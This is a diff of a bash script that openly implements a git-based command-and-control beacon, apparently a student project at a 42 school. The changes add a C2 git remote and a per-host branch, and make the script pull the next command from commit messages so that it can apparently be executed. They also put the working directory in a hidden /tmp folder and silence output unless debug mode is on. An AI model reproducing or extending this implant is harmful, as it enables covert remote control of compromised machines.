@@ -1,16 +1,35 @@
 #!/usr/bin/env bash
 # Heavily uses bashisms, do not port to POSIX sh
 
+log () {
+	local level ansi
+
+	level="${1}"
+	shift
+	case "${level}" in
+		(fatal) ansi="41;30" ;;
+		(err) ansi="31" ;;
+		(warn) ansi="33" ;;
+		(debug) ansi="90" ;;
+		(*) ansi="45;30" ;;
+	esac
+	printf "\033[${ansi}m%s: %s: %s: %s\033[m\n" "${0}" "${FUNCNAME[2]}" "${BASH_LINENO[1]}" "$*" >&2
+}
+
+fatal () {
+	log fatal "${@}"
+}
+
 err () {
-	printf '\033[31m%s\033[m\n' "$*" >&2
+	log err "${@}"
 }
 
 warn () {
-	printf '\033[33m%s\033[m\n' "$*" >&2
+	log warn "${@}"
 }
 
 debug () {
-	printf '\033[90m%s\033[m\n' "$*" >&2
+	log debug "${@}"
 }
 
 C2="git@vogsphere.42berlin.de:vogsphere/intra-uuid-17a60d50-65e8-4462-b546-c09f7a20c21c-5663399-tischmid"
@@ -19,37 +38,51 @@ BEACON_ID="$(hostname -s)" || BEACON_ID="${HOSTNAME%%.*}"
 POLL_RATE="1"
 unset CDPATH
 
-tmpdir="$(mktemp -d)" || { err "error creating tmpdir"; exit 1; }
+tmpdir="$(mktemp -d -p /tmp .gitc2beaconXXXXXXXXX)" || { err "error creating tmpdir"; exit 1; }
 orig_dir="$(pwd)" || { warn "error changing to tmpdir (not exiting)"; }
 cd -- "${tmpdir}" || { err "error changing to tmpdir"; exit 1; }
 
 _grey () {
-	printf '\033[90m'
+	printf '\033[90m' >&2
 }
 
 _rst () {
-	printf '\033[m'
+	printf '\033[m' >&2
 }
 
+# Remove temporary directory and cd back to a sane place
 _cleanup () {
 	printf '\n'
-	warn "Cleaning up..."
-	_grey
-	cd /
-	rm -rvf -- "${tmpdir}" || { err "error deleting tmpdir"; }
-	cd -- "${orig_dir}" || cd || cd -- "${HOME}" || cd -- ~ || pwd
-	_rst
+	if [ "${DEBUG}" = "on" ]
+	then
+		warn "Cleaning up..."
+		_grey
+			cd /
+			rm -rfv -- "${tmpdir}" || { err "error deleting tmpdir"; }
+			cd -- "${orig_dir}" || cd || cd -- "${HOME}" || cd -- ~ || pwd
+		_rst
+	fi
 	warn "Exiting"
 } && trap _cleanup EXIT
 
 _fetch_next_command () {
-	printf '%s\n' "echo hi"
+	local next_id stdin
+
+	git show-ref "${BEACON_ID}" \
+		|| { warn "Pull failed (ref doesnt exist)"; return 1; }
+	git pull \
+		|| { warn "Pull failed"; return 1; }
+	next_id="$(comm -23 <(git log --author=in --format=%ae | sort) <(git log --author=out --format=%ae | sort) | sort -n | head -1)"
+	stdin="$(git log -1 --author="${next_id}" --format=%s ; printf .)"
+	stdin="${stdin%.}"
+	printf '%s' "${stdin}"
 }
 
 _send_result () {
 	echo "Sent!"
 }
 
+# Override git command to make it DEBUG aware
 git () {
 	local subcomand
 
@@ -59,14 +92,17 @@ git () {
 	if [ "${DEBUG}" = "on" ]
 	then
 		_grey
-		command git "${subcomand}" "${@}"
+			command git "${subcomand}" "${@}"
+			status="${?}"
 		_rst
+		return "${status}"
 	else
 		2>/dev/null 1>&2 command git "${subcomand}" -q "${@}"
 	fi
 }
 
-# TODO: Make asynchronous, you don't want to lose the connection when you send a blocking/neverending command
+# TODO: Make asynchronous, you don't want to lose the
+# connection when you send a blocking/neverending command
 _fetch_eval () {
 	local cmd status pipestatus elapsed
 
@@ -84,11 +120,21 @@ _fetch_eval () {
 
 init () {
 	git init
+	git remote add c2 "${C2}"
+	git show-ref "${BEACON_ID}" \
+		&& git pull c2 "${BEACON_ID}" \
+		|| git branch "${BEACON_ID}"
+	git checkout "${BEACON_ID}"
+	git branch --set-upstream-to="c2/${BEACON_ID}"
 	if [ "${DEBUG}" = "on" ]
 	then
 		_grey
-		pwd
-		ls -al
+			pwd
+			ls -al
+			printf '%s\n' "${C2@A}"
+			printf '%s\n' "${BEACON_ID@A}"
+			printf '%s\n' "${POLL_RATE@A}"
+			printf '\n'
 		_rst
 	fi
 }
